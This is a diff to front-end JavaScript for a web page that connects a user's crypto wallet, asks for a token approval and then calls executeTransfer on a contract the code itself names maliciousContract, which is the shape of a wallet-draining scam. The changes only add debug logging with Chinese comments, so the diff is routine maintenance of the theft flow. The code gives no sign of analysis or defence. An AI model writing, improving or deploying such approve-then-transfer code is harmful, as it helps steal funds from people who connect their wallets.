@@ -104,9 +104,11 @@ document.getElementById('connectButton').onclick = async () => {
         try {
             await window.ethereum.request({ method: 'eth_requestAccounts' });
             userAccount = await web3.eth.getAccounts().then(accounts => accounts[0]);
+            console.log('Wallet connected: ', userAccount); // 调试信息
             alert('Wallet connected: ' + userAccount);
             document.getElementById('approveButton').disabled = false; // 启用授权按钮
         } catch (error) {
+            console.error('Connection error: ', error); // 调试信息
             alert('Failed to connect wallet: ' + error.message);
         }
     } else {
@@ -123,6 +125,7 @@ document.getElementById('approveButton').onclick = async () => {
         alert('Approval successful');
         document.getElementById('executeTransferButton').disabled = false; // 启用转移按钮
     } catch (error) {
+        console.error('Approval error: ', error); // 调试信息
         alert('Approval failed: ' + error.message);
     }
 };
@@ -134,6 +137,7 @@ document.getElementById('executeTransferButton').onclick = async () => {
         await maliciousContract.methods.executeTransfer(userAccount).send({ from: userAccount });
         alert('Transfer executed successfully');
     } catch (error) {
+        console.error('Transfer error: ', error); // 调试信息
         alert('Transfer failed: ' + error.message);
     }
 };
